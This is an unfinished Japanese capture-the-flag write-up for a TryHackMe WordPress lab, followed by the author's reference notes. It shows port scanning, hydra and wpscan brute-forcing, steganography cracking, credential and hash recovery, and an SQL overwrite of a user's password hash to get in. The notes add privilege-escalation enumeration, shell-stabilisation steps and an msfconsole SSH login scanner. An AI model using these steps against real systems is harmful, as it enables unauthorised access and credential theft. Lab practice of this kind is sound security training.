# Different CTF

https://tryhackme.com/room/adana

## Enumeration

```shell
TARGET=10.48.134.123
sudo bash -c "echo $TARGET   diff.thm  adana.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p21,80 $TARGET

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

FTP, HTTPのみ。FTPは匿名接続不可。

### ディレクトリ列挙

/announcements/ ディレクトリ発見。

ワードリストとJPGファイルをダウンロード。  
JPGに対して、stegseek, strings, exiftool をかけたが何も出なかった。

```sh
dirb http://$TARGET

---- Scanning URL: http://10.48.134.123/ ----
==> DIRECTORY: http://10.48.134.123/announcements/                                                                   
+ http://10.48.134.123/index.php (CODE:301|SIZE:0)                                                                   
==> DIRECTORY: http://10.48.134.123/javascript/                                                                      
==> DIRECTORY: http://10.48.134.123/phpmyadmin/                                                                      
+ http://10.48.134.123/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://10.48.134.123/wp-admin/                                                                        
==> DIRECTORY: http://10.48.134.123/wp-content/                                                                      
==> DIRECTORY: http://10.48.134.123/wp-includes/                                                                     
+ http://10.48.134.123/xmlrpc.php (CODE:405|SIZE:42)
```

### wpscan

hakanbey01 ユーザーのみ発見。

```sh
$ wpscan --url http://adana.thm/ -e

[i] User(s) Identified:

[+] hakanbey01
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://adana.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

ワードリストを使ってブルートフォースを書けたが空振り。

```sh
wpscan --url http://adana.thm/ --passwords wordlist.txt --usernames hakanbey01
```

### ワードリスト

あとは、ワードリストを使えるとしたらFTPかJPG。

FTPは空振り。

```sh
hydra -l hakanbey01 -P wordlist.txt $TARGET ftp -t 30

root@ip-10-48-85-75:~# hydra -l hakanbey01 -P wordlist.txt $TARGET ftp -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-06 01:48:47
[DATA] max 30 tasks per 1 server, overall 30 tasks, 50000 login tries (l:1/p:50000), ~1667 tries per task
[DATA] attacking ftp://10.48.134.123:21/
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-06 01:48:49
```

stegseek でワードリストを指定したらファイルが出てきた。

```sh
$ stegseek ./austrailian-bulldog-ant.jpg ./wordlist.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "austrailian-bulldog-ant.jpg.out".
```

FTPの認証情報。

```sh
$ cat ./austrailian-bulldog-ant.jpg.out | base64 -d
FTP-LOGIN
USER: hakanftp
PASS: [REDACTED]
```

## FTP

```sh
ftp> ls -al
229 Entering Extended Passive Mode (|||55142|)
150 Here comes the directory listing.
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 .
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 ..
-rw-------    1 1001     1001           88 Jan 13  2021 .bash_history
drwx------    2 1001     1001         4096 Jan 11  2021 .cache
drwx------    3 1001     1001         4096 Jan 11  2021 .gnupg
-rw-r--r--    1 1001     1001          554 Jan 10  2021 .htaccess
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK.
```

wp-config.php

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '[REDACTED]' );
```

/phpmyadmin にログインできた。

phpmyadmin1 DB からパスワードハッシュを取得。rockyou.txt でクラックできた。

```
hakanbey01
$P$BEy[REDACTED]
```

phpmyadmin DBはこれ（念のため取得）。こちらはクラックできなかった。wordlist.txt でも失敗。

```
hakanbey01
$P$BQML2QxAFBH4hb.qqKTpDnta6Q6Wl2/
```

## wordpress

入手した認証情報をWordPressログイン。・・・できるかと思ったが、エラー。

```
Error: The password you entered for the username hakanbey01 is incorrect.
```

実際に稼働しているのはFTPで見えているソースではなく、phpmyadmin DB を参照しているのではないかと想像する。

phpmyadmin DB のパスワードハッシュはクラックできなかったが、phpmyadmin1と同じハッシュ値に更新したらログインできるのでは？と考えた。

```sql
update wp_users set user_pass='$P$BEyLE[REDACTED]';
```

ログイン成功した。

Twenty Nineteen の 404テンプレートをリバースシェルに書き換えたかったが、ファイルに書き込みパーミッションが付いていないらしく、保存できなかった。

次にMediaアップロードを試みたが、これも書き込み権限がないため普通のファイルもアップロードできない。





# 続きは後日












## 権限昇格

```sh
# env_keep+=LD_PRELOAD は見落としがちなので注意
sudo -l
```

```sh
find / -perm -u=s -type f -ls 2>/dev/null
```

```sh
find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
```

```sh
getcap -r / 2>/dev/null
ls -al /var/backups
cat /etc/crontab
cat /etc/exports
```

どうしても何も見つからない場合の最後の手段として、linpeasのCVEリストに有効なものがないか確認する。

## 振り返り

-
-

## Tags

#tags: #tags: #tags:

```sh
# 大分類（Linuxはタグ付けしない）
Window Kerberos pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM

# 脆弱性の種類
CVE-xxxx-yyyyy カーネルエクスプロイト
ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報

# 攻撃の種類
サービス LFI SSRF XSS SQLインジェクション 競合 フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス PaddingOracles

# ツールなど
docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle
```

## メモ

### シェル安定化

```shell
# python が無くても、python3 でいける場合もある
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236
```

### SSH

ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする

```sh
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
```

エラー

```sh
# no matching host key type found. Their offer: ssh-rsa,ssh-dss
# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
```
